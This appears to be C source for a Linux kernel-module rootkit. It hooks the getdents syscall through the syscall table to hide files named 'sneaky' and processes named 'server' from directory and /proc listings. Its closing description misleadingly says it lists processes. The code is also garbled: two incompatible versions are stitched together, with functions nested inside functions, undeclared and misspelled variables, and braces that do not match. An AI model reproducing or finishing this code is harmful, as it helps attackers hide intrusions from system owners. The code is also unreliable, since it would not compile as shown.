#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/types.h>
#include <linux/dirent.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yann KOETH");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define sys_getdents __NR_getdents
#define sneak_phrase "sneaky"
unsigned long* syscall_table;
struct linux_dirent{
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[];

}

asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp , unsigned int count);


    static asmlinkage long* hijackgetdents(void){
    struct linux_dirent *hijackedDirent;
    char* fileNames;
    long original = originalGetDents(fd, dirp, count);

    if (original<= 0){
      return original;
    }
    hijackedBuffer= (char*)dirent;

    int counter=0;
    while(counter<original){
        hijackedDirent=(struct linux_dirent*)(fileNames+counter);
        if((strncmp(hijackedDirent->name,sneak_phrase, (sizeof(sneak_phrase)-1))))
        memcpy(hijackedBuffer+counter, hijakcedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
    }
      else{
        counter = counter + hijackedDirent->d_reclen;
      }

return original;

}

  static asmlinkage long* sneakyprocess(void) {

    //extern void* sys_call_table[];
    /*process name we want to hide*/
    char mtroj[] = "server";

    int (*orig_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);

    /*convert a string to number*/
    int myatoi(char *str) {
      int res = 0;
      int mul = 1;
      char *ptr;
      for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
        if (*ptr < '0' || *ptr > '9')
          return (-1);
        res += (*ptr - '0') * mul;
        mul *= 10;
      }
      return (res);
    }
    /*get task structure from PID*/
    struct task_struct *get_task(pid_t pid) {
      struct task_struct *p = current;
      do {
        if (p->pid == pid)
          return p;
          p = p->next_task;
        }
        while (p != current);
        return NULL;
    }

    /*get process name from task structure*/
    static inline char *task_name(struct task_struct *p, char *buf) {
      int i;
      char *name;
      name = p->comm;
      i = sizeof(p->comm);
      do {
        unsigned char c = *name;
        name++;
        i--;
        *buf = c;
        if (!c)
          break;
        if (c == '\\') {
          buf[1] = c;
          buf += 2;
          continue;
        }
        if (c == '\n') {
          buf[0] = '\\';
          buf[1] = 'n';
          buf += 2;
          continue;
        }
        buf++;
      }
      while (i);
      *buf = '\n';
      return buf + 1;
    }

    /*check whether we need to hide this process*/
    int invisible(pid_t pid) {
      struct task_struct *task = get_task(pid);
      char *buffer;
      if (task) {
        buffer = kmalloc(200, GFP_KERNEL);
        memset(buffer, 0, 200);
        task_name(task, buffer);
        if (strstr(buffer, (char *) &mtroj)) {
          kfree(buffer);
          return 1;
        }
      }
      return 0;
    }

    int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
      unsigned int tmp, n;
      int t, proc = 0;
      struct inode *dinode;
      struct dirent *dirp2, *dirp3;
      tmp = (*orig_getdents) (fd, dirp, count);

      #ifdef __LINUX_DCACHE_H
        dinode = current->files->fd[fd]->f_dentry->d_inode;
      #else
        dinode = current->files->fd[fd]->f_inode;
      #endif

      if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
        proc=1;
      if (tmp > 0) {
         dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
         memcpy_fromfs(dirp2, dirp, tmp);
         dirp3 = dirp2;
         t = tmp;
         while (t > 0) {
            n = dirp3->d_reclen;
            t -= n;
            if ((proc && invisible(myatoi(dirp3->d_name)))) {
              if (t != 0)
                memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
              else
                dirp3->d_off = 1024;
                tmp -= n;
              }
              if (t != 0)
                dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
              }
              memcpy_tofs(dirp, dirp2, tmp);
              kfree(dirp2);
            }
            return tmp;
          }

          int init_module(void)                 /*module setup*/
          {
            orig_getdents=sys_call_table[SYS_getdents];
            sys_call_table[SYS_getdents]=hacked_getdents;
            return 0;
          }

          void cleanup_module(void)            /*module shutdown*/
          {
            sys_call_table[SYS_getdents]=orig_getdents; }










  }



static int init_syscall(void)
{
        syscall_table = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
        originalGetDents=syscall_table[sys_getdents];
        syscall_table[sys_getdents]=(unsigned long*) hijackgetdents;
        printk(KERN_INFO "Custom syscall loaded\n");
        return 0;
}

static void cleanup_syscall(void)
{
        syscall_table[sys_getdents]=originalGetDents;
        printk(KERN_INFO "Syscall at offset %d : %p\n", sys_getdents, (void *)syscall_table[sys_getdents]);
        printk(KERN_INFO "Custom syscall unloaded\n");
}

module_init(init_syscall);
module_exit(cleanup_syscall);


MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
